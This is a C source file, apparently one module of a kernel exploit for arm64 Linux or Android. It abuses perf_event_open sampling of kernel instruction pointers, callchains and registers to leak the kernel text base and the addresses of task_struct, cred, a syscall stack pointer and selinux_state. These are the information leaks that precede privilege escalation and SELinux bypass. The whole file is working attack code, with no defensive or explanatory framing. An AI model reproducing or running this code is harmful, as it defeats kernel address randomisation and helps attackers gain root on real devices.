#include "common.h"

uint64_t ring_u64(const uint8_t *ring, uint64_t size, uint64_t pos) {
  uint64_t v, off = pos & (size - 1);
  if (off + 8 <= size) memcpy(&v, ring + off, 8);
  else {
    uint8_t b[8]; uint64_t first = size - off;
    memcpy(b, ring + off, first); memcpy(b + first, ring, 8 - first);
    memcpy(&v, b, 8);
  }
  return v;
}

uint64_t leak_text(void) {
  pr_info("perf_event_open CPU_CLOCK sampling 30000...\n");
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 100000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN;
  a.sample_max_stack = 32;
  a.disabled = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 33;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 30000; i++) syscall(__NR_gettid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint64_t head = m->data_head, tail = m->data_tail, min = UINT64_MAX;
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t rs = m->data_size;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (rs - 1);
    if (off + sizeof(h) <= rs) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t b[sizeof(h)]; size_t first = rs - off;
      memcpy(b, ring + off, first); memcpy(b + first, ring, sizeof(h)-first);
      memcpy(&h, b, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h);
      uint64_t ip = ring_u64(ring, rs, pos); pos += 16;
      uint64_t nr = ring_u64(ring, rs, pos); pos += 8;
      if (ip >= UINT64_C(0xffff000000000000) && ip < min) min = ip;
      for (uint64_t i = 0; i < nr && pos + 8 <= tail + h.size; i++) {
        uint64_t x = ring_u64(ring, rs, pos); pos += 8;
        if (x >= UINT64_C(0xffff000000000000) && x < min) min = x;
      }
    }
    tail += h.size;
  }
  munmap(m, map_size); close(fd);
  uint64_t res = min == UINT64_MAX ? 0 : (min & ~UINT64_C(0x1fffff)) + 0x80000;
  if (res) pr_info("Text base derived: 0x%016llx\n", (unsigned long long)res);
  return res;
}

uint64_t leak_task_from_status(const char *status_path, uint64_t *cred_out) {
  pr_info("Leaking task_struct/cred via %s\n", status_path);
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 10000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  PERF_SAMPLE_REGS_INTR;
  a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  int status_fd = open(status_path, O_RDONLY | O_CLOEXEC);
  if (status_fd < 0) { close(fd); return 0; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(status_fd); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  char status[4096];
  for (int i = 0; i < 5000; i++) {
    syscall(__NR_lseek, status_fd, 0, SEEK_SET);
    syscall(__NR_read, status_fd, status, sizeof(status));
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (size - 1);
    if (off + sizeof(h) <= size) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t b[sizeof(h)]; size_t first = size - off;
      memcpy(b, ring + off, first); memcpy(b + first, ring, sizeof(h)-first);
      memcpy(&h, b, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, size, pos);
      pos += 16;
      uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, size, pos); pos += 8;
      uint64_t state = runtime_text + OFF_TASK_STATE;
      if (abi && ip >= state && ip < state + 0x720 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        unsigned task_reg = ip <= state + 0x24 ? 3 : 26;
        uint64_t task = ring_u64(ring, size, pos + task_reg * 8);
        if (task >= UINT64_C(0xffffff8000000000) &&
            task < UINT64_C(0xffffffc000000000) && !(task & 7)) {
          unsigned slot;
          for (slot = 0; slot < 16 && candidates[slot] &&
               candidates[slot] != task; slot++);
          if (slot < 16) { candidates[slot] = task; counts[slot]++; }
        }
      }
      if (abi && ip >= state + 0x94 && ip < state + 0x350 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t cred = ring_u64(ring, size, pos + 20 * 8);
        if (cred >= UINT64_C(0xffffff8000000000) &&
            cred < UINT64_C(0xffffffc000000000) && !(cred & 7))
          *cred_out = cred;
      }
    }
    tail += h.size;
  }
  uint64_t best = 0; unsigned best_count = 0;
  for (unsigned i = 0; i < 16; i++)
    if (counts[i] > best_count) { best = candidates[i]; best_count = counts[i]; }
  munmap(m, map_size); close(status_fd); close(fd);
  if (best_count && *cred_out) {
      pr_success("Task %016llx | Cred %016llx (votes: %u)\n", (unsigned long long)best, (unsigned long long)*cred_out, best_count);
  }
  return best_count && *cred_out ? best : 0;
}

uint64_t leak_syscall_sp(void) {
  pr_info("Leaking syscall stack pointer via futex...\n");
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 1000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  PERF_SAMPLE_REGS_INTR;
  a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  volatile int a1 = 1, a2 = 0;
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 5000; i++)
    (void)raw_futex(&a1, WAIT_REQUEUE_PI_PRIVATE, 0, 0, &a2, 0);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  uint64_t fun = runtime_text + OFF_FUTEX_WAIT_REQUEUE_PI;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (size - 1);
    if (off + sizeof(h) <= size) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t b[sizeof(h)]; size_t first = size - off;
      memcpy(b, ring + off, first); memcpy(b + first, ring, sizeof(h)-first);
      memcpy(&h, b, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, size, pos);
      pos += 16;
      uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, size, pos); pos += 8;
      if (abi && ip >= fun + 0x80 && ip < fun + 0x380 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t sp = ring_u64(ring, size, pos + 31 * 8);
        uint64_t syscall_sp = sp + 0x230;
        unsigned slot;
        for (slot = 0; slot < 16 && candidates[slot] &&
             candidates[slot] != syscall_sp; slot++);
        if (slot < 16) { candidates[slot] = syscall_sp; counts[slot]++; }
      }
    }
    tail += h.size;
  }
  uint64_t best = 0; unsigned best_count = 0;
  for (unsigned i = 0; i < 16; i++)
    if (counts[i] > best_count) { best = candidates[i]; best_count = counts[i]; }
  munmap(m, map_size); close(fd);
  if (best) pr_info("Waiter stack pointer: 0x%016llx\n", (unsigned long long)best);
  return best_count ? best : 0;
}

uint64_t leak_selinux_state(void) {
  pr_info("Leaking selinux_state via /sys/fs/selinux/enforce...\n");
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 1000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  PERF_SAMPLE_REGS_INTR;
  a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (enforce_fd < 0) { close(fd); return 0; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(enforce_fd); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  char b[8];
  for (int i = 0; i < 5000; i++) {
    (void)syscall(__NR_lseek, enforce_fd, 0, SEEK_SET);
    (void)syscall(__NR_read, enforce_fd, b, sizeof(b));
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  uint64_t fun = runtime_text + OFF_SEL_READ_ENFORCE;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (size - 1);
    if (off + sizeof(h) <= size) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t tmp[sizeof(h)]; size_t first = size - off;
      memcpy(tmp, ring + off, first);
      memcpy(tmp + first, ring, sizeof(h) - first);
      memcpy(&h, tmp, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, size, pos);
      pos += 16;
      uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, size, pos); pos += 8;
      if (abi && ip >= fun + 0x54 && ip <= fun + 0x5c &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t state = ring_u64(ring, size, pos + 8 * 8);
        if (state >= UINT64_C(0xffffffc000000000) && !(state & 0xfff)) {
          unsigned slot;
          for (slot = 0; slot < 16 && candidates[slot] &&
               candidates[slot] != state; slot++);
          if (slot < 16) { candidates[slot] = state; counts[slot]++; }
        }
      }
    }
    tail += h.size;
  }
  uint64_t best = 0; unsigned best_count = 0;
  for (unsigned i = 0; i < 16; i++)
    if (counts[i] > best_count) { best = candidates[i]; best_count = counts[i]; }
  munmap(m, map_size); close(enforce_fd); close(fd);
  if (best) pr_info("Selinux state: 0x%016llx\n", (unsigned long long)best);
  return best_count ? best : 0;
}

